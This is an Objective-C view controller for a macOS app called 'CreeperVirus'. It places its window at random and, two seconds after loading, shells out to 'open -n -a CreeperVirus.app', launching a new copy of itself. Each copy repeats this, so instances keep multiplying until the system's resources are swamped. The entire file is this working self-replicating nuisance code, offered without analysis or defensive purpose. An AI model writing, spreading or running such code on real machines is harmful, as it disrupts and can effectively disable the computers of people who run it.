//
//  ViewController.m
//  CreeperVirus

#import "ViewController.h"

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    
    _window = [[[NSApplication sharedApplication] windows] objectAtIndex:0];
    [self setWindowPosition];
    
    [self performSelector:@selector(runViralCommand) withObject:nil afterDelay:2.0];
}

-(void) runViralCommand {
    [self runCommand:@"open -n -a CreeperVirus.app"];
}

- (void)setWindowPosition {
    float randomX = arc4random_uniform([[NSScreen mainScreen] visibleFrame].size.width);
    float randomY = arc4random_uniform([[NSScreen mainScreen] visibleFrame].size.height);

    NSPoint pos;
    pos.x = randomX;
    pos.y = randomY;
    [_window setFrameOrigin : pos];
}

- (NSString *)runCommand:(NSString *)commandRun {
    
    NSTask *task = [[NSTask alloc] init];
    [task setLaunchPath:@"/bin/sh"];
    
    NSArray *arguments = [NSArray arrayWithObjects:
                          @"-c" ,
                          [NSString stringWithFormat:@"%@", commandRun],
                          nil];
    NSLog(@"run command:%@", commandRun);
    [task setArguments:arguments];
    
    NSPipe *pipe = [NSPipe pipe];
    [task setStandardOutput:pipe];
    
    NSFileHandle *file = [pipe fileHandleForReading];
    
    [task launch];
    
    NSData *data = [file readDataToEndOfFile];
    
    NSString *output = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
    return output;
}

@end
